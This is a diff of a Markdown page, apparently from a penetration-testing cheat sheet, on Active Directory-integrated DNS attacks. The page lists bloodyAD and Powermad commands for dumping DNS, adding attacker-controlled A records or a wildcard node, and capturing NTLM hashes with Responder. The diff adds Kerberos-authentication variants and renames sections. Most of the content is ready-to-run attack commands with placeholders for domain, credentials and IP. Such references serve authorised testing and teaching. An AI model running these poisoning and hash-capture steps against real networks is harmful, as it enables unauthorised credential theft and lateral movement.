@@ -1,9 +1,11 @@
 ---
 title: "ADIDNS"
-tags: ["Domain", "ADIDNS", "ADDS", "DNS", "PowerMad", "DNS Posioning", "Spoofing", "Windows", "Active Directory"]
+tags: ["Active Directory", "ADIDNS", "ADDS", "DNS", "DNS Posioning", "Domain", "PowerMad", "Spoofing", "Windows"]
 ---
 
-### General
+{{< filter_buttons >}}
+
+### Enumeration
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
@@ -11,31 +13,41 @@ tags: ["Domain", "ADIDNS", "ADDS", "DNS", "PowerMad", "DNS Posioning", "Spoofing
 
 #### 1. DNS Dump
 
-```console
+```console {class="password"}
 # Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get dnsDump
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
 bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> get dnsDump
 ```
 
-```console
-# Kerberos
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> get dnsDump
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+ bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> get dnsDump
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> get dnsDump
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
-#### 1. Import Module
+#### 1. Import Powermad
 
 ```console
 . .\Powermad.ps1
 ```
 
-#### 2. Enum
+#### 2. Enumerate
 
 ```console
 # Get ADIDNS zone
@@ -48,13 +60,13 @@ Get-ADIDNSPermission
 ```
 
 ```console
-# Remove a node
+# Remove a wildcard node
 Remove-ADIDNSNode -Node *
 ```
 
 {{< /tabcontent >}}
 
-### Abuse #1: ADIDNS Poisoning
+### ADIDNS Poisoning
 
 {{< tab set2 tab1 >}}Linux{{< /tab >}}
 {{< tab set2 tab2 >}}Windows{{< /tab >}}
@@ -62,22 +74,32 @@ Remove-ADIDNSNode -Node *
 
 #### 1. Add a New A Record
 
-```console
+```console {class="password"}
 # Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
 bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
 ```
 
-```console
-# Kerberos
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+ bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
 ```
 
-#### 2. Steal NTLM
+#### 2. Capture NTLM
 
 ```console
 sudo responder -I tun0
@@ -86,7 +108,7 @@ sudo responder -I tun0
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
 
-#### 1. Import Module
+#### 1. Import Powermad
 
 ```console
 . .\Powermad.ps1
@@ -99,6 +121,7 @@ $dnsRecord = New-DNSRecordArray -Type A -Data <LOCAL_IP>
 ```
 
 ```console
+# Create a wildcard node
 New-ADIDNSNode -Node * -Tombstone -DNSRecord $dnsRecord -Verbose
 ```
 
@@ -108,7 +131,7 @@ New-ADIDNSNode -Node * -Tombstone -DNSRecord $dnsRecord -Verbose
 Resolve-DnsName DoesNotExist
 ```
 
-#### 4. Steal NTLM
+#### 4. Capture NTLM
 
 ```console
 sudo responder -I tun0
